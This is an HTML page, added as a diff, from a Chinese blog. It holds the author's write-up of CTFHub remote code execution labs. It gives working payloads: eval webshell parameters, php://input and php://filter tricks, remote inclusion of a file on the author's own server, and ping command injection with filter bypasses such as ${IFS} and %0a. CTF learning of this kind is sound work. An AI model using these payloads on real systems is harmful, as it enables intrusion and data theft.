@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>CTFHub-RCE学习 - Hannibal0x の Blog</title><meta name="Description" content="Hannibal0x的个人学习博客"><meta property="og:title" content="CTFHub-RCE学习" />
+<meta property="og:description" content="0x00 前言 菜鸡记录汇总下RCE的学习过程。 0x01 eval执行 &lt;code&gt;&lt;?php&lt;br&gt;if&nbsp;(isset($_REQUEST&#91;&#39;cmd&#39;]))&nbsp;{&lt;br&gt;&nbsp;&nbsp;&nbsp;&nbsp;eval($_REQUEST&#91;&#34;cmd&#34;]);&lt;br&gt;}&nbsp;else&nbsp;{&lt;br&gt;&nbsp;&nbsp;&nbsp;&nbsp;highlight_file(__FILE__);&lt;br&gt;}&lt;br&gt;?&gt;&lt;/code&gt; 简单审计可以看出，利用危险函数eval执行php代码的特性，用POST或GET方法上传" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://hannibal0x.github.io/2021-02-20-ctfhub-rce%E5%AD%A6%E4%B9%A0/" /><meta property="og:image" content="https://hannibal0x.github.io/images/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-02-20T11:19:00+00:00" />
+<meta property="article:modified_time" content="2021-02-20T11:19:00+00:00" /><meta property="og:site_name" content="Hannibal0x の Blog" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://hannibal0x.github.io/images/logo.png"/>
+
+<meta name="twitter:title" content="CTFHub-RCE学习"/>
+<meta name="twitter:description" content="0x00 前言 菜鸡记录汇总下RCE的学习过程。 0x01 eval执行 &lt;code&gt;&lt;?php&lt;br&gt;if&nbsp;(isset($_REQUEST&#91;&#39;cmd&#39;]))&nbsp;{&lt;br&gt;&nbsp;&nbsp;&nbsp;&nbsp;eval($_REQUEST&#91;&#34;cmd&#34;]);&lt;br&gt;}&nbsp;else&nbsp;{&lt;br&gt;&nbsp;&nbsp;&nbsp;&nbsp;highlight_file(__FILE__);&lt;br&gt;}&lt;br&gt;?&gt;&lt;/code&gt; 简单审计可以看出，利用危险函数eval执行php代码的特性，用POST或GET方法上传"/>
+<meta name="application-name" content="Hannibal0x の Blog">
+<meta name="apple-mobile-web-app-title" content="Hannibal0x の Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/images/logo.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://hannibal0x.github.io/2021-02-20-ctfhub-rce%E5%AD%A6%E4%B9%A0/" /><link rel="prev" href="https://hannibal0x.github.io/2021-02-16-%E5%87%8C%E8%99%9A%E5%B9%B3%E5%8F%B0ctf%E8%AE%AD%E7%BB%83%E8%90%A5%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E9%9A%90%E5%86%99%E5%8F%96%E8%AF%81/" /><link rel="next" href="https://hannibal0x.github.io/2021-02-26-ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "CTFHub-RCE学习",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/hannibal0x.github.io\/2021-02-20-ctfhub-rce%E5%AD%A6%E4%B9%A0\/"
+        },"genre": "posts","wordcount":  1915 ,
+        "url": "https:\/\/hannibal0x.github.io\/2021-02-20-ctfhub-rce%E5%AD%A6%E4%B9%A0\/","datePublished": "2021-02-20T11:19:00+00:00","dateModified": "2021-02-20T11:19:00+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Hannibal0x"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Hannibal0x の Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/logo.png"
+        data-srcset="/images/logo.png, /images/logo.png 1.5x, /images/logo.png 2x"
+        data-sizes="auto"
+        alt="/images/logo.png"
+        title="/images/logo.png" width="32" height="32" />Hannibal0x の Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"><i class='fas fa-book'></i> 文章 </a><a class="menu-item" href="/tags/"><i class='fas fa-tags'></i> 标签 </a><a class="menu-item" href="/categories/"><i class='fas fa-folder'></i> 分类 </a><a class="menu-item" href="/about/"><i class='fas fa-flag'></i> 关于 </a><a class="menu-item" href="http://hannibal0x.top" rel="noopener noreffer" target="_blank"><i class='fas fa-history'></i> 旧博客 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="都几岁啦，还这么害羞，让我康康！" id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Hannibal0x の Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/logo.png"
+        data-srcset="/images/logo.png, /images/logo.png 1.5x, /images/logo.png 2x"
+        data-sizes="auto"
+        alt="/images/logo.png"
+        title="/images/logo.png" width="32" height="32" />Hannibal0x の Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="都几岁啦，还这么害羞，让我康康！" id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title=""><i class='fas fa-book'></i>文章</a><a class="menu-item" href="/tags/" title=""><i class='fas fa-tags'></i>标签</a><a class="menu-item" href="/categories/" title=""><i class='fas fa-folder'></i>分类</a><a class="menu-item" href="/about/" title=""><i class='fas fa-flag'></i>关于</a><a class="menu-item" href="http://hannibal0x.top" title="" rel="noopener noreffer" target="_blank"><i class='fas fa-history'></i>旧博客</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">CTFHub-RCE学习</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Hannibal0x</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2021-02-20">2021-02-20</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1915 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;4 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#0x00-前言">0x00 前言</a></li>
+    <li><a href="#0x01-eval执行">0x01 eval执行</a></li>
+    <li><a href="#0x02-文件包含figure-classwp-block-image-size-large">0x02 文件包含<figure class="wp-block-image size-large"></a></li>
+    <li><a href="#0x03-phpinputfigure-classwp-block-image-size-large">0x03 php://input<figure class="wp-block-image size-large"></a></li>
+    <li><a href="#0x04-读取源代码figure-classwp-block-image-size-large">0x04 读取源代码<figure class="wp-block-image size-large"></a></li>
+    <li><a href="#0x05-远程包含figure-classwp-block-image-size-large">0x05 远程包含<figure class="wp-block-image size-large"></a></li>
+    <li><a href="#0x06-命令注入">0x06 命令注入</a></li>
+    <li><a href="#0x07-过滤cat">0x07 过滤cat</a></li>
+    <li><a href="#0x08-过滤空格">0x08 过滤空格</a></li>
+    <li><a href="#0x09-过滤目录分割符">0x09 过滤目录分割符</a></li>
+    <li><a href="#0x0a-过滤运算符">0x0A 过滤运算符</a></li>
+    <li><a href="#0x0b-综合过滤练习">0x0B 综合过滤练习</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><div class="has-toc have-toc">
+</div>
+<h2 id="0x00-前言">0x00 前言</h2>
+<p>菜鸡记录汇总下RCE的学习过程。</p>
+<h2 id="0x01-eval执行">0x01 eval执行</h2>
+<pre class="wp-block-code"><code>&lt;code>&lt;?php&lt;br>if&nbsp;(isset($_REQUEST&#91;'cmd']))&nbsp;{&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;eval($_REQUEST&#91;"cmd"]);&lt;br>}&nbsp;else&nbsp;{&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;highlight_file(__FILE__);&lt;br>}&lt;br>?&gt;</code>&lt;/code></pre>
+<p>简单审计可以看出，利用危险函数eval执行php代码的特性，用POST或GET方法上传字符串。首先，传入<code>cmd=phpinfo();</code>测试，可以得到php的信息。<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" width="1376" height="682" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片.png" alt="" class="wp-image-1615" /> </figure></p>
+<p>再利用system函数，这个函数可以执行系统命令并将相应的执行结果输出。上传<code>cmd=system(ls /);</code>发现并未得到预计结果，发现是因为函数中存在空格，修改为<code>cmd=system(&quot;ls /&quot;);</code>，发现可疑文件。<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" width="929" height="41" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-1.png" alt="" class="wp-image-1616" /> </figure></p>
+<p>最后，上传<code>cmd=system(&quot;cat /flag_11847&quot;);</code>，得到flag。<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" width="372" height="39" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-2.png" alt="" class="wp-image-1617" /> </figure></p>
+<h2 id="0x02-文件包含figure-classwp-block-image-size-large">0x02 文件包含<figure class="wp-block-image size-large"></h2>
+<p><img loading="lazy" width="687" height="382" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-3.png" alt="" class="wp-image-1619" /> </figure></p>
+<p>strpos() 函数查找字符串在另一字符串中第一次出现的位置。include() 语句包含并运行指定文件。点击shell，跳转到新页面。</p>
+<pre class="wp-block-code"><code>&lt;?php eval($_REQUEST&#91;'ctfhub']);?&gt;</code></pre>
+<p>于是构造<code>file=shell.txt&amp;ctfhub=system(&quot;ls&quot;);</code><figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" width="296" height="81" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-4.png" alt="" class="wp-image-1620" /> </figure></p>
+<p>继续构造<code>file=shell.txt&amp;ctfhub=system(&quot;ls /&quot;);</code>发现flag文件<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" width="879" height="107" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-5.png" alt="" class="wp-image-1621" /> </figure></p>
+<p>最后构造<code>file=shell.txt&amp;ctfhub=system(&quot;cat /flag&quot;);</code><figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" width="365" height="31" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-6.png" alt="" class="wp-image-1622" /> </figure></p>
+<h2 id="0x03-phpinputfigure-classwp-block-image-size-large">0x03 php://input<figure class="wp-block-image size-large"></h2>
+<p><img loading="lazy" width="659" height="405" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-7.png" alt="" class="wp-image-1623" /> </figure></p>
+<p><strong>php://input</strong>可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。<figure class="wp-block-image"></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img-blog.csdnimg.cn/20190212171710961.png"
+        data-srcset="https://img-blog.csdnimg.cn/20190212171710961.png, https://img-blog.csdnimg.cn/20190212171710961.png 1.5x, https://img-blog.csdnimg.cn/20190212171710961.png 2x"
+        data-sizes="auto"
+        alt="https://img-blog.csdnimg.cn/20190212171710961.png"
+        title="在这里插入图片描述" /> </figure></p>
+<p>利用BP抓包后，使用post方式传递<code>&lt;?php system(&quot;ls /&quot;);?&gt;</code>，发现可疑文件。<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" width="971" height="548" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-8.png" alt="" class="wp-image-1624" /> </figure></p>
+<p>继续构造，读取flag。<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" width="905" height="352" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-9.png" alt="" class="wp-image-1625" /> </figure></p>
+<h2 id="0x04-读取源代码figure-classwp-block-image-size-large">0x04 读取源代码<figure class="wp-block-image size-large"></h2>
+<p><img loading="lazy" width="657" height="434" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-10.png" alt="" class="wp-image-1627" /> </figure></p>
+<p>题目暗示了读取，想到了php://filter,php://filter 是php中独有的一个协议，可以作为一个中间流来处理其他流，可以进行任意文件的读取，而且提示了flag的位置。构造<code>file=php://filter/resource=/flag</code><figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" width="398" height="132" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-12.png" alt="" class="wp-image-1629" /> </figure></p>
+<h2 id="0x05-远程包含figure-classwp-block-image-size-large">0x05 远程包含<figure class="wp-block-image size-large"></h2>
+<p><img loading="lazy" width="500" height="433" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-13.png" alt="" class="wp-image-1630" /> </figure></p>
+<p>在自己的云服务器上创建1.txt，内容为：<code>&lt;?php system(&quot;ls /&quot;);?&gt;</code>。再构造<code>file=http://ip/1.txt</code>。<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" width="879" height="116" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-14.png" alt="" class="wp-image-1631" /> </figure></p>
+<p>修改1.txt文件内容为<code>&lt;?php system(&quot;cat /flag&quot;);?&gt;</code>。<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" width="358" height="114" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-15.png" alt="" class="wp-image-1632" /> </figure></p>
+<h2 id="0x06-命令注入">0x06 命令注入</h2>
+<p>题目：这是一个在线测试网络延迟的平台，路由器中经常会见到。无任何安全措施，尝试获取 flag<figure class="wp-block-image size-large is-resized"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-16.png" alt="" class="wp-image-1633" width="371" height="966" /> </figure></p>
+<p>页面说明了没有过滤，先输入<code>127.0.0.1</code>测试。<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" width="535" height="107" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-17.png" alt="" class="wp-image-1634" /> </figure></p>
+<p>再输入<code>127.0.0.1|ls</code>，分隔命令，发现可疑文件</p>
+<blockquote class="wp-block-quote">
+  <p>
+    linux中：%0a 、%0d 、; 、& 、| 、&&、||<br />windows中：%0a、&、|、%1a
+  </p>
+</blockquote><figure class="wp-block-image size-large">
+<p><img loading="lazy" width="300" height="113" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-18.png" alt="" class="wp-image-1635" /> </figure></p>
+<p>最后输入<code>127.0.0.1| cat 281511716412108.php</code>，没有回显，查看源代码，在注释部分发现flag<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" width="584" height="590" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-19.png" alt="" class="wp-image-1636" /> </figure></p>
+<h2 id="0x07-过滤cat">0x07 过滤cat</h2>
+<p>题目：过滤了cat命令之后，你还有什么方法能读到 Flag?</p>
+<pre class="wp-block-code"><code>&lt;code>&lt;?php&lt;br>&lt;br>$res&nbsp;=&nbsp;FALSE;&lt;br>&lt;br>if&nbsp;(isset($_GET&#91;'ip'])&nbsp;&&&nbsp;$_GET&#91;'ip'])&nbsp;{&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;$ip&nbsp;=&nbsp;$_GET&#91;'ip'];&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;$m&nbsp;=&nbsp;&#91;];&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(!preg_match_all("/cat/",&nbsp;$ip,&nbsp;$m))&nbsp;{&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$cmd&nbsp;=&nbsp;"ping&nbsp;-c&nbsp;4&nbsp;{$ip}";&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exec($cmd,&nbsp;$res);&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;{&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$res&nbsp;=&nbsp;$m;&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;}&lt;br>}&lt;br>?&gt;</code>&lt;/code></pre>
+<p>首先输入<code>127.0.0.1|ls</code>，发现可疑文件<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" width="331" height="130" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-20.png" alt="" class="wp-image-1637" /> </figure></p>
+<p>用more代替cat，<code>127.0.0.1|more flag_90275466365.php</code>，在源码中发现flag。</p>
+<h2 id="0x08-过滤空格">0x08 过滤空格</h2>
+<p>题目：这次过滤了空格，你能绕过吗</p>
+<pre class="wp-block-code"><code>&lt;code>&lt;?php&lt;br>&lt;br>$res&nbsp;=&nbsp;FALSE;&lt;br>&lt;br>if&nbsp;(isset($_GET&#91;'ip'])&nbsp;&&&nbsp;$_GET&#91;'ip'])&nbsp;{&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;$ip&nbsp;=&nbsp;$_GET&#91;'ip'];&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;$m&nbsp;=&nbsp;&#91;];&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(!preg_match_all("/&nbsp;/",&nbsp;$ip,&nbsp;$m))&nbsp;{&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$cmd&nbsp;=&nbsp;"ping&nbsp;-c&nbsp;4&nbsp;{$ip}";&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exec($cmd,&nbsp;$res);&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;{&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$res&nbsp;=&nbsp;$m;&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;}&lt;br>}&lt;br>?&gt;</code>&lt;/code></pre>
+<p>首先输入<code>127.0.0.1|ls</code>，发现可疑文件<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" width="340" height="113" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-21.png" alt="" class="wp-image-1638" /> </figure></p>
+<p>空格可以用以下字符串代替：</p>
+<blockquote class="wp-block-quote">
+  <p>
+    < 、<>、%20(space)、%09(tab)、$IFS$9、 ${IFS}、$IFS等
+  </p>
+</blockquote>
+<p>$IFS在linux下表示分隔符，但是如果单纯的cat$IFS2，bash解释器会把整个IFS2当做变量名，所以导致输不出来结果，然而如果加一个{}就固定了变量名，同理在后面加个$可以起到截断的作用，但是为什么要用$9呢，因为$9只是当前系统shell进程的第九个参数的持有者，它始终为空字符串。</p>
+<h2 id="0x09-过滤目录分割符">0x09 过滤目录分割符</h2>
+<p>题目：这次过滤了目录分割符 / ，你能读到 flag 目录下的 flag 文件吗</p>
+<pre class="wp-block-code"><code>&lt;code>&lt;?php&lt;br>&lt;br>$res&nbsp;=&nbsp;FALSE;&lt;br>&lt;br>if&nbsp;(isset($_GET&#91;'ip'])&nbsp;&&&nbsp;$_GET&#91;'ip'])&nbsp;{&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;$ip&nbsp;=&nbsp;$_GET&#91;'ip'];&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;$m&nbsp;=&nbsp;&#91;];&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(!preg_match_all("/\//",&nbsp;$ip,&nbsp;$m))&nbsp;{&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$cmd&nbsp;=&nbsp;"ping&nbsp;-c&nbsp;4&nbsp;{$ip}";&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exec($cmd,&nbsp;$res);&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;{&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$res&nbsp;=&nbsp;$m;&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;}&lt;br>}&lt;br>?&gt;</code>&lt;/code></pre>
+<p>首先输入<code>127.0.0.1|ls</code>，发现可疑文件夹<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" width="230" height="113" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-22.png" alt="" class="wp-image-1639" /> </figure></p>
+<p>再输入<code>127.0.0.1|ls flag_is_here</code><figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" width="330" height="90" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-23.png" alt="" class="wp-image-1640" /> </figure></p>
+<p>这道题开始时想复杂了，在研究怎么替换\，陷入了惯性思维，实际上切换到相应的目录即可，输入<code>127.0.0.1;cd flag_is_here;cat flag_8988745131535.php</code></p>
+<h2 id="0x0a-过滤运算符">0x0A 过滤运算符</h2>
+<p>题目：过滤了几个运算符, 要怎么绕过呢</p>
+<pre class="wp-block-code"><code>&lt;code>&lt;?php&lt;br>&lt;br>$res&nbsp;=&nbsp;FALSE;&lt;br>&lt;br>if&nbsp;(isset($_GET&#91;'ip'])&nbsp;&&&nbsp;$_GET&#91;'ip'])&nbsp;{&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;$ip&nbsp;=&nbsp;$_GET&#91;'ip'];&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;$m&nbsp;=&nbsp;&#91;];&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(!preg_match_all("/(\||\&)/",&nbsp;$ip,&nbsp;$m))&nbsp;{&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$cmd&nbsp;=&nbsp;"ping&nbsp;-c&nbsp;4&nbsp;{$ip}";&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exec($cmd,&nbsp;$res);&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;{&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$res&nbsp;=&nbsp;$m;&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;}&lt;br>}&lt;br>?&gt;</code>&lt;/code></pre>
+<p>输入<code>127.0.0.1;ls</code>，发现可疑文件<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" width="547" height="155" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-24.png" alt="" class="wp-image-1641" /> </figure></p>
+<p>构造<code>127.0.0.1;cat flag_24490310699067.php</code>，得到flag</p>
+<h2 id="0x0b-综合过滤练习">0x0B 综合过滤练习</h2>
+<p>题目：同时过滤了前面几个小节的内容, 如何打出漂亮的组合拳呢?</p>
+<pre class="wp-block-code"><code>&lt;code>&lt;?php&lt;br>&lt;br>$res&nbsp;=&nbsp;FALSE;&lt;br>&lt;br>if&nbsp;(isset($_GET&#91;'ip'])&nbsp;&&&nbsp;$_GET&#91;'ip'])&nbsp;{&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;$ip&nbsp;=&nbsp;$_GET&#91;'ip'];&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;$m&nbsp;=&nbsp;&#91;];&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(!preg_match_all("/(\||&|;|&nbsp;|\/|cat|flag|ctfhub)/",&nbsp;$ip,&nbsp;$m))&nbsp;{&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$cmd&nbsp;=&nbsp;"ping&nbsp;-c&nbsp;4&nbsp;{$ip}";&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exec($cmd,&nbsp;$res);&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;{&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$res&nbsp;=&nbsp;$m;&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;}&lt;br>}&lt;br>?&gt;</code>&lt;/code></pre>
+<p>首先，构造<code>ip=127.0.0.1%0als</code>绕过分割符过滤<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" width="885" height="497" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-25.png" alt="" class="wp-image-1642" /> </figure></p>
+<p>构造<code>ip=127.0.0.1%0acd${IFS}fla*%0als</code>利用${IFS}绕过空格，*绕过flag，发现flag文件<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" width="520" height="113" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-26.png" alt="" class="wp-image-1643" /> </figure></p>
+<p>最后构造<code>ip=127.0.0.1%0acd${IFS}fla%0amore${IFS}fla*</code>，得到flag。<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" width="524" height="110" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-27.png" alt="" class="wp-image-1644" /> </figure></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2021-02-20</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/2021-02-20-ctfhub-rce%E5%AD%A6%E4%B9%A0/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
